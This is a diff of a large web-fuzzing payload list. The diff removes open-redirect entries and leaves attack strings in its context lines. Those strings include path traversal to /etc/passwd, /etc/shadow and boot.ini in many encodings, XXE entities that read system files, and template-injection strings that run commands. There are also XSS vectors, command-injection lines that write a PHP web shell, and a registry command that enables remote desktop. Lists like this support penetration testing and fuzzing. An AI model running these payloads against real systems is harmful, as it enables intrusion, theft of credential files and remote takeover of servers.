 http://www.whitelisteddomain.tld@[::216.58.214.206]
 http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
@@ -5863,7 +5490,6 @@ http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
 /Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf%00
 /Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php
 /Volumes/Macintosh_HD1/usr/local/php/lib/php.ini%00
-////www.whitelisteddomain.tld@www.google.com/%2e%2e
 ${"freemarker.template.utility.Execute"?new()("id")}
 \152\141\166\141\163\143\162\151\160\164\072alert(1)
 %252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini
@@ -5919,8 +5545,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 /Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf%00
 /Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php
 /Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php
-//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
-//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
 \x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
@@ -5970,8 +5594,6 @@ echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
 ../../../../../../../usr/local/apache/logs/error.l og
 ../../../../../../../usr/local/apache/logs/error_l og
 /Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf%00
-///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
-///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
 /0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
 %252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html
@@ -6009,8 +5631,6 @@ javascript://www.whitelisteddomain.tld?%a0alert%281%29
 ../../../../../../../usr/local/apache/logs/access. log
 ../../../../../../../usr/local/apache/logs/access_ log
 /Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php%00
-////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
-////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/
 /0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\
 %252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
@@ -6095,8 +5715,6 @@ ABC<div style="x:\x20expression(javascript:alert(1)">DEF
 & echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
 ; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
 | echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
-https:///www.whitelisteddomain.tld@www.google.com/%2e%2e
-/https://www.whitelisteddomain.tld@www.google.com/%2e%2e
 http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
@@ -6157,7 +5775,6 @@ C:/program files (x86)/apache group/apache/conf/error.log
 C:/windows/system32/inetsrv/config/applicationhost.config
 <!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
 && echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
-https://www.whitelisteddomain.tld/https://www.google.com/
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 /..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215boot.ini
 /..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215
@@ -6184,10 +5801,7 @@ C:/program files (x86)/apache group/apache/conf/access.log
 C:/program files (x86)/apache group/apache/conf/httpd.conf
 ../../../../../../../../../../../../../../../../etc/passwd
 ../../../../../../../../../../../../../../../etc/passwd%00
-https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
-https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
 /Volumes/webBackup/private/etc/httpd/httpd.conf.default%00
-//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd
 0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd
@@ -6218,8 +5832,6 @@ C:/windows/system32/inetsrv/config/schema/aspnet_schema.xml
 ./\/././\/././\/././\/././\/././\/././\/././\/.//etc/passwd
 .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\/etc/passwd
 /..././..././..././..././..././..././..././..././etc/passwd
-https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
-/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
 http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
@@ -6242,8 +5854,6 @@ ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
 C:/program files (x86)/filezilla server/filezilla server.xml
 .//..//.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd
 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
-//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
-/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini
@@ -6274,7 +5884,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini
 /%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini
-/?url=/\/google.com&next=/\/google.com&redirect=/\/google.com
 $field.in("org.apache.velocity.runtime.VelocityEngineVersion")
 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
@@ -6389,7 +5998,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 ..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025boot.ini
 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd
 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd
-%19Jav%09asc%09ript:https%20://google.com/%250Aconfirm%25281%2529
 %252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html
 %252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini%00index.html
 /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini
@@ -6457,7 +6065,6 @@ ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
 C:\WINDOWS\win.ini../../../../../../../../../../../../etc/hosts%00
 data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
 data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
-/https://google.com@google.com/%2f.//or.karmaz.pl@google.com/%2f..
 <title onpropertychange=javascript:alert(1)></title><title title=>
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/
 /%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\
@@ -6938,7 +6545,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUw
 %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
-/?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redirect_uri=/\/google.com
 /%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/
 /%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\
 ........................................................................../../../boot.ini
@@ -7029,7 +6635,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bh
 ..........................................................................\..\..\..\..\boot.ini
 ........................................................................../../../..//etc/passwd
 ..........................................................................\..\..\..\/etc/passwd
-/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com
 %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini
 %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini
 %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini;index.html
@@ -7139,7 +6744,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
 %c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
 %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e//etc/passwd
 %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\/etc/passwd
-/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com
 0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
 0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
 ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25afboot.ini
@@ -7182,7 +6786,6 @@ reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnec
 %2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdyUwMA==
-/redirect?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redir=/\/google.com&rurl=/\/google.com
 & reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 | reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
@@ -7274,14 +6877,12 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
 %c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
 %uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215/etc/passwd
 %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216/etc/passwd
-/?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
 /%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c
 /%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af
 /%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c
 /%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/
-/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
@@ -7310,7 +6911,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
 %25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini
 %25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cboot.ini
 %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/boot.ini
-/redirect?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
 /%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini
@@ -7319,7 +6919,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
 /%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini
 /%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cboot.ini
 /%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/boot.ini
-/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com
 /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
 %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd
@@ -7328,7 +6927,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
 %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd
 <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
 %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
-data:google.com;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
 %25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/boot.ini
 %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\boot.ini
 %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66boot.ini
@@ -7348,7 +6946,6 @@ data:google.com;text/html;charset=UTF-8,<html><script>document.write(document.do
 /%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini
 /%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afboot.ini
 /%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cboot.ini
-/redirect?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redir=/\/google.com&rurl=/\/google.com&redirect_uri=/\/google.com
 /%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215boot.ini
 /%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
@@ -7420,7 +7017,6 @@ data:google.com;text/html;charset=UTF-8,<html><script>document.write(document.do
 /%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\boot.ini
 /%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66boot.ini
 /%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63boot.ini
-/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com
 %25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
 %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
 %25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afboot.ini
@@ -7432,7 +7028,6 @@ data:google.com;text/html;charset=UTF-8,<html><script>document.write(document.do
 %25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
 %25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
-/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com
 /%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/
 /%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\
 /%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66
